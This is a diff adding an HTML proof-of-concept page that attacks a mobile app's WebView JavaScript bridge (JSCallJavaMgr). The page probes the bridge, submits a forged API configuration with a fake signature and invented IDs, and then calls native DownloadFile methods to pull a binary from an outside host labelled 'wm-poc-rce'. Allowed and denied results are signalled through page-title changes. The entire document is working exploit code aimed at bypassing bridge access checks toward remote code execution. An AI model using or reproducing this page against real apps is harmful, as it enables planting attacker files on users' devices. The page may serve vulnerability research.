@@ -1,0 +1,63 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>P25TB</title></head>
+<body><h1>P25TB</h1>
+<script>
+document.title='P25TB-START';
+var q=[], busy=false;
+function note(t){
+  q.push(String(t));
+  kick();
+}
+function kick(){
+  if(busy || !q.length) return;
+  busy=true;
+  document.title=q.shift();
+  setTimeout(function(){ busy=false; kick(); }, 800);
+}
+function call(mod, method, param){
+  if(!window.JSCallJavaMgr){ note('NOJSB'); return; }
+  window.JSCallJavaMgr.JSCallNative(JSON.stringify({
+    callback:'window.__wmpoc', module:mod, method:method, param:param||{},
+    callId:mod+'.'+method
+  }));
+}
+function norm(res){
+  if(typeof res==='string'){
+    try{ res=JSON.parse(res); }catch(e){ return {callId:'RAW', code:-1, message:String(res).slice(0,80)}; }
+  }
+  return res||{};
+}
+window.__wmpoc=function(res){
+  res=norm(res);
+  var msg=String(res.message||JSON.stringify(res)).replace(/\|/g,'/');
+  var deny=msg.indexOf('URL denied')>=0 || msg.indexOf('not config')>=0 || msg.indexOf('webpage config is empty')>=0;
+  note((deny?'D':'A')+':'+(res.callId||'?').replace('Plugin.','/')+':'+res.code+':'+msg.slice(0,72));
+};
+var cfg={
+  url:location.href,
+  timestamp:'1725500000',
+  nonceStr:'p25nonce',
+  signature:'00deadbeef',
+  corpId:'200000001',
+  appId:'200000001',
+  sdkId:'1410000014',
+  jsApiList:['DownloadFile','LoadUrl','OpenNewPage','GetFileBase64']
+};
+var steps=[
+  function(){ note('JSB='+!!window.JSCallJavaMgr); },
+  function(){ call('OpenApiPlugin','CheckJsApiConfig',{}); },
+  function(){ call('OpenApiPlugin','JsApiConfig', cfg); },
+  function(){ call('OpenApiPlugin','JsApiAgentConfig', cfg); },
+  function(){ call('CommonPlugin','DownloadFile',{url:'https://gitwhs.github.io/wm-poc-rce/p25.bin',fileName:'p25.bin'}); },
+  function(){ call('MeetlogWebPlugin','DownloadFile',{url:'https://gitwhs.github.io/wm-poc-rce/p25.bin',fileName:'p25.bin'}); }
+];
+var i=0;
+function next(){
+  if(i>=steps.length){ setTimeout(function(){ note('P25TB-DONE'); }, 1600); return; }
+  try{ steps[i](); }catch(e){ note('EX:'+e); }
+  i++;
+  setTimeout(next, 800);
+}
+setTimeout(next, 400);
+</script>
+</body></html>
